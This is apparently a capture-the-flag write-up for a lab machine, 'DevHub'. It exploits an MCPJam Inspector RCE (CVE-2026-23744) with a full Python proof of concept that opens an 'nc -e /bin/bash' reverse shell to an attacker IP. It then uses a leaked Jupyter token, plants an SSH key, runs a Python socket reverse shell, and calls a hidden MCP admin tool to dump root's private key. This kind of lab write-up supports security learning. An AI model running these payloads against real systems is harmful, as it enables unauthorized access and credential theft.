# DevHub

## Reconnaissance

Command:

```bash
nmap -sV -sC -T5 devhub.htb
```

The scan reveals SSH (22) and an nginx web server on 80.

```text
22/tcp   open  ssh
80/tcp   open  http
```

Add `devhub.htb` to `/etc/hosts`:

```bash
echo "<target_ip> devhub.htb" | sudo tee -a /etc/hosts
```

---

## Enumerate the Web Application

Navigating to `http://devhub.htb` reveals a feature referencing **MCPJam**, exposing an MCPJam Inspector instance on port `6274`.

The MCPJam interface is accessed at:

```text
http://devhub.htb:6274
```

The **Settings** section discloses the running version:

```text
MCPJam Inspector 1.4.2
```

---

## Fingerprint the MCPJam Inspector API

The Inspector exposes an API endpoint:

```text
http://devhub.htb:6274/api/mcp/connect
```

An empty POST request confirms the expected request body:

```bash
curl -s -X POST http://devhub.htb:6274/api/mcp/connect \
  -H 'Content-Type: application/json' \
  -d '{}'
```

```json
{
  "success": false,
  "error": "serverConfig is required"
}
```

The response confirms the backend processes a `serverConfig` object.

---

## Exploit MCPJam Inspector Unauthenticated RCE (CVE-2026-23744)

MCPJam Inspector `1.4.2` is vulnerable to **CVE-2026-23744**, an unauthenticated RCE affecting the `/api/mcp/connect` endpoint. A malicious `serverConfig` lets an attacker supply an arbitrary command and arguments, resulting in execution by the MCPJam Inspector backend. The vulnerability affects versions up to `1.4.2` and is fixed in `1.4.3`.

PoC used:

https://github.com/d3vn0mi/CVE-2026-23744-POC

Advisory:

https://github.com/advisories/GHSA-232v-j27c-5pp6

```python
import requests
import argparse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser()
parser.add_argument("target", help="Target MCPJam Inspector URL")
parser.add_argument("--ip", required=True, help="Attacker IP")
parser.add_argument("--port", required=True, type=int, help="Listener port")
args = parser.parse_args()

url = f"{args.target}/api/mcp/connect"

data = {
    "serverConfig": {
        "command": "busybox",
        "args": ["nc", args.ip, str(args.port), "-e", "/bin/bash"],
        "env": {}
    },
    "serverId": "213j1l3jkljkl3j"
}

requests.post(url, json=data, verify=False)
```

Start a listener:

```bash
nc -lvnp 8888
```

Run the exploit:

```bash
python3 exploit.py http://devhub.htb:6274 --ip <attacker_ip> --port 8888
```

```text
connect to [<attacker_ip>] from (UNKNOWN) [<target_ip>] 44322
```

The initial shell is obtained as `mcp-dev`.

---

## Enumerate the Initial Shell

```bash
ls -la /home
```

```text
drwxr-x--- 9 analyst analyst 4096 May 27 12:22 analyst
drwxr-x--- 4 mcp-dev mcp-dev 4096 May 27 12:22 mcp-dev
```

```bash
uname -a
```

```text
Linux devhub 5.15.0-179-generic #189-Ubuntu SMP Tue May 5 18:20:56 UTC 2026 x86_64
```

Process enumeration reveals a JupyterLab instance running as `analyst`:

```bash
ps aux | grep -i jupyter
```

```text
analyst 1089 ... /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False
```

The JupyterLab instance is bound to `127.0.0.1:8888`.

---

## Leak the JupyterLab Token and Query the API

The process command line exposes a Jupyter authentication token:

```text
a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

Confirmed locally:

```bash
curl -s http://127.0.0.1:8888/api
```

```json
{
  "version": "2.17.0"
}
```

The Jupyter contents API is queried using the token:

```bash
curl -s \
  -H 'Authorization: token a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7' \
  http://127.0.0.1:8888/api/contents
```

A notebook named `quarterly_analysis.ipynb` is discovered, containing only placeholder analytics code and no useful credentials.

---

## Establish Persistent Access and Port Forwarding

An SSH keypair is generated and the public key dropped into `mcp-dev`'s `authorized_keys`:

```bash
ssh-keygen -t ed25519 -f ~/.ssh/pivot_key

mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAkbWdN2uxWmghY5D6GDrHmVPUeZ8naU7710HszWeO3B arnavigator@kali' >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

```bash
ssh -i ~/.ssh/pivot_key mcp-dev@devhub.htb
```

Since JupyterLab is only bound to loopback, an SSH local port forward is created:

```bash
ssh -i ~/.ssh/pivot_key -N \
  -L 8888:127.0.0.1:8888 \
  mcp-dev@devhub.htb
```

Verified from the attacking machine:

```bash
curl http://127.0.0.1:8888/api
```

```json
{
  "version": "2.17.0"
}
```

The UI at `http://127.0.0.1:8888` is then accessed in a browser using the leaked token.

---

## Obtain Code Execution as analyst

A new Jupyter notebook is created. Since Jupyter executes notebook kernels under the account that owns the Jupyter process, code execution through the notebook results in execution as `analyst`:

```python
import socket
import subprocess
import os

s = socket.socket()
s.connect(("<attacker_ip>", 9001))

p = subprocess.Popen(
    ["/bin/bash", "-i"],
    stdin=s,
    stdout=s,
    stderr=s
)
```

Listener:

```bash
nc -lvnp 9001
```

The reverse shell connects back as `analyst`, upgraded to a full TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Retrieve User Flag

```bash
cat /home/analyst/user.txt
```

The user flag is obtained.

---

# Privilege Escalation

## Identify a Root-Owned Service

```bash
ps aux
```

```text
root 1095 ... /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

File permissions are checked:

```bash
ls -la /opt/opsmcp/
```

```text
-rw-r----- 1 analyst analyst 6021 Mar 16 2026 /opt/opsmcp/server.py
```

The script is owned by `analyst`, meaning that although the service is executed by `root`, `analyst` can read the Python source.

---

## Enumerate the OPSMCP Service

The service is listening locally on port `5000`:

```bash
ss -lntup
```

```text
tcp LISTEN 127.0.0.1:5000
tcp LISTEN 127.0.0.1:8888
tcp LISTEN 0.0.0.0:6274
tcp LISTEN 0.0.0.0:80
tcp LISTEN 0.0.0.0:22
```

The source contains a hardcoded API key:

```python
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
```

The application exposes the following endpoints:

```text
/tools/list
/tools/call
/health
```

---

## Identify Hidden OPSMCP Tools

The source defines two tools excluded from `/tools/list`:

```python
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    "ops._debug_mode": {
        "description": "Enable debug mode",
        "parameters": {}
    }
}
```

Although not advertised, `/tools/call` validates requests against `ALL_TOOLS`, which includes both visible and hidden tools — so `_admin_dump` can still be invoked with the hardcoded API key.

---

## Dump the Root SSH Key

```bash
curl -s http://127.0.0.1:5000/tools/call \
  -H 'Content-Type: application/json' \
  -H 'X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a' \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
```

The service returns the root user's private SSH key. It is extracted into a file:

```bash
curl -s http://127.0.0.1:5000/tools/call \
  -H 'Content-Type: application/json' \
  -H 'X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a' \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["root_private_key"])' > /tmp/root_key

chmod 600 /tmp/root_key
```

```text
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
```

---

## SSH as Root

```bash
ssh -o StrictHostKeyChecking=no -i /tmp/root_key root@devhub.htb
```

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

---

## Retrieve Root Flag

```bash
cat /root/root.txt
```

The root flag is successfully obtained.

---

# Attack Chain

```text
Nmap (22/tcp SSH, 80/tcp HTTP) →
devhub.htb webpage references MCPJam → Inspector on port 6274, version 1.4.2 →
CVE-2026-23744 unauthenticated RCE via /api/mcp/connect → shell as mcp-dev →
JupyterLab found on 127.0.0.1:8888, token leaked in process arguments →
SSH persistence + local port forward to reach JupyterLab →
Notebook code execution → shell as analyst (user flag) →
Root-owned /opt/opsmcp/server.py, source readable by analyst →
Hardcoded OPSMCP API key →
Hidden ops._admin_dump tool reachable via /tools/call →
Root SSH private key disclosed →
SSH as root (root flag)
```